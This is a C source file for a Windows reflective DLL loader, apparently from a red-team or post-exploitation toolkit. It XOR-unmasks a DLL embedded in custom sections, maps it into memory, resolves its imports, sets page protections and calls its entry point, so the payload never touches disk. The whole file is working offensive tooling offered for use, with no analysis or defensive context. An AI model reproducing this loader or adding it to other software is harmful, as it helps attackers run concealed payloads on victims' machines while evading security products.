/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$VirtualAlloc   (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualFree    (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
DECLSPEC_IMPORT int    WINAPIV MSVCRT$strncmp          (const char * string1, const char * string2, size_t count);

__typeof__(GetModuleHandleA) * pGetModuleHandle __attribute__((section(".text")));
__typeof__(GetProcAddress)   * pGetProcAddress  __attribute__((section(".text")));

char * resolve(char * module, char * function) {
    HANDLE hModule = pGetModuleHandle(module);
    if (hModule == NULL) {
        hModule = LoadLibraryA(module);
    }
    return (char *)pGetProcAddress(hModule, function);
}

#define GETRESOURCE(x) (char *)&x

char _DLL_[0] __attribute__((section("dll")));
char _KEY_[0] __attribute__((section("key")));

typedef struct {
    int   length;
    char  value[];
} RESOURCE;

typedef struct {
   char * start;
   DWORD  length;
   DWORD  offset;
} RDATA_SECTION;

void FixSectionPermissions(DLLDATA * dll, char * dst, RDATA_SECTION * rdata)
{
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    void                  * sectionDst       = NULL;
    DWORD                   sectionSize      = 0;
    DWORD                    newProtection     = 0;
    DWORD                    oldProtection     = 0;

    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < numberOfSections; i++)
    {
        sectionDst  = dst + sectionHdr->VirtualAddress;
        sectionSize = sectionHdr->SizeOfRawData;

        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtection = PAGE_WRITECOPY;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
            newProtection = PAGE_READONLY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
            newProtection = PAGE_READWRITE;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtection = PAGE_EXECUTE;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtection = PAGE_EXECUTE_WRITECOPY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtection = PAGE_EXECUTE_READ;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            newProtection = PAGE_EXECUTE_READWRITE;
        }

        KERNEL32$VirtualProtect(sectionDst, sectionSize, newProtection, &oldProtection);
        
        if (MSVCRT$strncmp((char *)sectionHdr->Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
            rdata->start  = sectionDst;
            rdata->length = sectionSize;
            rdata->offset = dll->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
        }

        sectionHdr++;
    }
}

void go(void * loaderArguments)
{
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* get the masked dll and key */
    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);

    /* unmask and load into memory */
    char * src = (char *)KERNEL32$VirtualAlloc(NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0; i < dll->length; i++) {
        src[i] = dll->value[i] ^ key->value[i % key->length];
    }

    /* parse dll headers */
    DLLDATA data;
    ParseDLL(src, &data);

    /* load it into new memory */
    char * dst = (char *)KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    LoadDLL(&data, src, dst);
    ProcessImports(&funcs, &data, dst);

    RDATA_SECTION rdata;
    FixSectionPermissions(&data, dst, &rdata);

    /* get the entry point */
    DLLMAIN_FUNC entryPoint = EntryPoint(&data, dst);

    /* free the unmasked copy */
    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);

    /* call entry point */
    entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, &rdata);
    entryPoint((HINSTANCE)GETRESOURCE(go), 0x04, loaderArguments);
}